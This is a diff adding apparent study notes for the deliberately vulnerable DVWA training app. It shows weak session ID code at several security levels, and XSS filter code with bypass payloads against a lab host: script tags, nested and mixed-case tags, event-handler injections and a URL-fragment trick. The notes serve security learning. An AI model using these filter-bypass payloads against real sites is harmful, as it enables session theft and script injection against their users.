@@ -123,8 +123,38 @@ SQL Injection (Blind)
 	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
 	
 Weak Session IDs
+	$_SESSION['last_session_id']++; 
+		Cookie: dvwaSession=7; security=low; PHPSESSID=58mi6ensci44filgagr6ucc3u3
+	$cookie_value = time(); 
+		
+	$_SESSION['last_session_id_high']++;$cookie_value = md5($_SESSION['last_session_id_high']); 
+	
+	$cookie_value = sha1(mt_rand() . time() . "Impossible"); 
+	 
 XSS (DOM)
+	http://1.117.162.201/dvwa/vulnerabilities/xss_d/?default=German
+		http://1.117.162.201/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
+	if( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) { 	if (stripos ($default, "<script") !== false) { } }
+		http://1.117.162.201/dvwa/vulnerabilities/xss_d/?#default=<script>alert(1)</script>
+		<sc<script>ript>
+		<body onload=alert('s')>
+		<a href='' onclick=alert('ss')>click</a>
+		<a href='' onclick=alert(/ss/)>click</a>
+	switch ($_GET['default']) { default:header ("location: ?default=English"); }
+		#default=<script>alert(1)</script>
+	
+	$name = htmlspecialchars($_GET['name']);
+		
 XSS (Reflected)
+	if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
+		<script>alert(1)</script>   //javascript:alert(1);
+	$name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
+		<SCRipt>alert(1)</scRipT>
+	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); //(.*)表示贪婪匹配，/i表示不区分大小写
+		<img src=1 onerror=alert(/high/)>
+		
+	$name = htmlspecialchars( $_GET[ 'name' ] ); 
+	
 XSS (Stored)
 CSP Bypass
 JavaScript
